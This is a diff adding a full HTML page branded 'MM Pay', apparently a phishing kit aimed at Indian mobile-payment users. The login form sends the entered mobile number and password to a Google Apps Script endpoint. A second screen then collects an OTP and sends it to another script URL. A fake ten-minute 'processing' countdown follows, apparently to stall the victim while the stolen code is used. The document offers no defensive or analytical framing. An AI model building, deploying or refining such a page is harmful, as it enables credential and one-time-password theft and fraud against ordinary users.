@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MM Pay - Login</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    background: #ffffff;
+    color: #333;
+    padding: 24px 28px 60px;
+    max-width: 480px;
+    margin: 0 auto;
+  }
+
+  /* Top bar */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 0 40px;
+  }
+  .bit-badge {
+    background: #1a1a1a;
+    color: #fff;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    padding: 5px 8px;
+    border-radius: 6px;
+  }
+  .page-title {
+    font-size: 28px;
+    font-weight: 800;
+    color: #333;
+  }
+  .lang-switch {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 18px;
+    color: #333;
+  }
+  .lang-switch .globe {
+    font-size: 20px;
+  }
+
+  /* Welcome section */
+  h1.welcome {
+    font-size: 32px;
+    font-weight: 800;
+    color: #333;
+    margin-bottom: 12px;
+  }
+  .login-account {
+    color: #f5a623;
+    font-size: 20px;
+    font-weight: 500;
+    margin-bottom: 32px;
+  }
+
+  /* Inputs */
+  .input-group {
+    display: flex;
+    align-items: center;
+    border: 1px solid #e2e2e6;
+    border-radius: 14px;
+    padding: 16px 18px;
+    margin-bottom: 18px;
+  }
+  .country-code {
+    font-size: 18px;
+    color: #333;
+    margin-right: 12px;
+    font-weight: 500;
+  }
+  .input-group input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 18px;
+    color: #333;
+    background: transparent;
+  }
+  .input-group input::placeholder {
+    color: #a3a3ab;
+  }
+
+  .forgot-password {
+    text-align: right;
+    margin: 8px 0 28px;
+  }
+  .forgot-password a {
+    color: #7c5cfc;
+    text-decoration: none;
+    font-size: 17px;
+  }
+
+  /* Checkbox */
+  .agreement {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 28px;
+    font-size: 17px;
+    color: #333;
+  }
+  .agreement input[type="checkbox"] {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 24px;
+    height: 24px;
+    border: 1.5px solid #7c5cfc;
+    border-radius: 6px;
+    position: relative;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+  .agreement input[type="checkbox"]:checked::after {
+    content: "";
+    position: absolute;
+    left: 7px;
+    top: 3px;
+    width: 6px;
+    height: 12px;
+    border: solid #7c5cfc;
+    border-width: 0 2px 2px 0;
+    transform: rotate(45deg);
+  }
+  .agreement a {
+    color: #7c5cfc;
+    text-decoration: none;
+  }
+
+  /* Login button */
+  .login-btn {
+    width: 100%;
+    padding: 20px;
+    background: #7c4dff;
+    background: linear-gradient(180deg, #8a5cf6, #7c4dff);
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    font-size: 20px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 28px;
+  }
+  .login-btn:hover {
+    background: #6d3ffb;
+  }
+
+  .signup-line {
+    text-align: center;
+    font-size: 17px;
+    color: #333;
+  }
+  .signup-line a {
+    color: #7c5cfc;
+    text-decoration: none;
+    font-weight: 500;
+  }
+
+  /* ---- Page 2: Name + Timer ---- */
+  .page {
+    display: none;
+  }
+  .page.active {
+    display: block;
+  }
+  .name-page h1.welcome {
+    margin-bottom: 8px;
+  }
+  .name-page .subtitle {
+    color: #8a8a92;
+    font-size: 16px;
+    margin-bottom: 32px;
+  }
+  .submit-btn {
+    width: 100%;
+    padding: 20px;
+    background: linear-gradient(180deg, #8a5cf6, #7c4dff);
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    font-size: 20px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .submit-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  /* Timer screen */
+  .timer-page {
+    text-align: center;
+    padding-top: 40px;
+  }
+  .timer-page .check-circle {
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    background: #eee7ff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 24px;
+    font-size: 34px;
+    color: #7c4dff;
+  }
+  .timer-page h1.welcome {
+    font-size: 26px;
+    margin-bottom: 8px;
+  }
+  .timer-page .subtitle {
+    color: #8a8a92;
+    font-size: 16px;
+    margin-bottom: 36px;
+  }
+  .timer-ring {
+    width: 220px;
+    height: 220px;
+    margin: 0 auto 32px;
+    position: relative;
+  }
+  .timer-ring svg {
+    width: 100%;
+    height: 100%;
+    transform: rotate(-90deg);
+  }
+  .timer-ring circle {
+    fill: none;
+    stroke-width: 12;
+  }
+  .timer-ring .bg-ring {
+    stroke: #f0edfc;
+  }
+  .timer-ring .fg-ring {
+    stroke: #7c4dff;
+    stroke-linecap: round;
+    transition: stroke-dashoffset 1s linear;
+  }
+  .timer-time {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 36px;
+    font-weight: 700;
+    color: #333;
+  }
+  .timer-label {
+    color: #8a8a92;
+    font-size: 15px;
+    margin-bottom: 40px;
+  }
+</style>
+</head>
+<body>
+
+  <!-- PAGE 1: LOGIN -->
+  <div class="page active" id="loginPage">
+    <div class="topbar">
+      <span class="bit-badge">BIT</span>
+      <span class="page-title">Login</span>
+      <span class="lang-switch"><span class="globe">🌐</span>English</span>
+    </div>
+
+    <h1 class="welcome">Welcome to MM Pay</h1>
+    <div class="login-account">Login Account</div>
+
+    <div class="input-group">
+      <span class="country-code">+91</span>
+      <input type="tel" placeholder="Enter Mobile Number" id="mobileInput">
+    </div>
+
+    <div class="input-group">
+      <input type="password" placeholder="Enter Password" id="passwordInput">
+    </div>
+
+    <div class="forgot-password">
+      <a href="#">Forgot Password?</a>
+    </div>
+
+    <label class="agreement">
+      <input type="checkbox" checked>
+      <span>I agree to the user <a href="#">Privacy Agreement</a></span>
+    </label>
+
+    <button class="login-btn" onclick="goToNamePage()">Login</button>
+
+    <div class="signup-line">
+      Don't have an account? <a href="#">Create Account</a>
+    </div>
+  </div>
+
+  <!-- PAGE 2: NAME ENTRY -->
+  <div class="page name-page" id="namePage">
+    <div class="topbar">
+      <span class="bit-badge">BIT</span>
+      <span class="page-title">Details</span>
+      <span class="lang-switch"><span class="globe">🌐</span>English</span>
+    </div>
+
+    <h1 class="welcome">Enter OTP</h1>
+    <div class="subtitle">Please enter the OTP to continue</div>
+
+    <div class="input-group">
+      <input type="text" inputmode="numeric" placeholder="Enter OTP" id="nameInput" maxlength="6">
+    </div>
+
+    <button class="submit-btn" onclick="goToTimerPage()">Submit</button>
+  </div>
+
+  <!-- PAGE 3: TIMER -->
+  <div class="page timer-page" id="timerPage">
+    <div class="topbar">
+      <span class="bit-badge">BIT</span>
+      <span class="page-title">Processing</span>
+      <span class="lang-switch"><span class="globe">🌐</span>English</span>
+    </div>
+
+    <div class="check-circle">✓</div>
+    <div class="subtitle">Your request is being processed</div>
+
+    <div class="timer-ring">
+      <svg viewBox="0 0 220 220">
+        <circle class="bg-ring" cx="110" cy="110" r="100"></circle>
+        <circle class="fg-ring" id="fgRing" cx="110" cy="110" r="100"></circle>
+      </svg>
+      <div class="timer-time" id="timeDisplay">10:00</div>
+    </div>
+    <div class="timer-label" id="timerStatusLabel">Please wait, timer in progress...</div>
+  </div>
+
+<script>
+  const LOGIN_SHEET_URL = 'https://script.google.com/macros/s/AKfycbypGwtv-DYnK05v8-jX5US5IRjONDwn7cCJ_oqtJjnD82IL-W16S2bPL3YPIfi5DI8S/exec';
+  const NAME_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxz4cLYl75TqxqYiBvoKGkYjF9LzKf7UfnPIL0prySHLu6JElSnm5a3_ggCS6cEwITS/exec';
+
+  function goToNamePage() {
+    const mobile = document.getElementById('mobileInput').value.trim();
+    const password = document.getElementById('passwordInput').value.trim();
+
+    if (!mobile) {
+      alert('Please enter your mobile number');
+      return;
+    }
+    if (!password) {
+      alert('Please enter your password');
+      return;
+    }
+
+    document.getElementById('loginPage').classList.remove('active');
+    document.getElementById('namePage').classList.add('active');
+
+    // Save login data to Login sheet
+    fetch(LOGIN_SHEET_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({ mobile: mobile, password: password })
+    }).catch(err => {
+      console.error('Login sheet save failed:', err);
+    });
+  }
+
+  function goToTimerPage() {
+    const otp = document.getElementById('nameInput').value.trim();
+    if (!otp) {
+      alert('Please enter the OTP');
+      return;
+    }
+    const mobileField = document.getElementById('mobileInput');
+    const mobile = mobileField ? mobileField.value.trim() : '';
+
+    document.getElementById('namePage').classList.remove('active');
+    document.getElementById('timerPage').classList.add('active');
+    startTimer(10 * 60); // 10 minutes in seconds
+
+    // Save OTP data to sheet
+    fetch(NAME_SHEET_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({ otp: otp, mobile: mobile })
+    }).catch(err => {
+      console.error('OTP sheet save failed:', err);
+    });
+  }
+
+  function startTimer(durationSeconds) {
+    const totalTime = durationSeconds;
+    let remaining = durationSeconds;
+    const timeDisplay = document.getElementById('timeDisplay');
+    const fgRing = document.getElementById('fgRing');
+    const statusLabel = document.getElementById('timerStatusLabel');
+    const radius = 100;
+    const circumference = 2 * Math.PI * radius;
+    fgRing.style.strokeDasharray = circumference;
+    fgRing.style.strokeDashoffset = 0;
+
+    function render() {
+      const mins = Math.floor(remaining / 60);
+      const secs = remaining % 60;
+      timeDisplay.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+      const progress = (totalTime - remaining) / totalTime;
+      fgRing.style.strokeDashoffset = circumference * progress;
+    }
+
+    render();
+    const interval = setInterval(() => {
+      remaining--;
+      if (remaining < 0) {
+        clearInterval(interval);
+        timeDisplay.textContent = '00:00';
+        statusLabel.textContent = 'Time completed!';
+        return;
+      }
+      render();
+    }, 1000);
+  }
+</script>
+
+</body>
+</html>
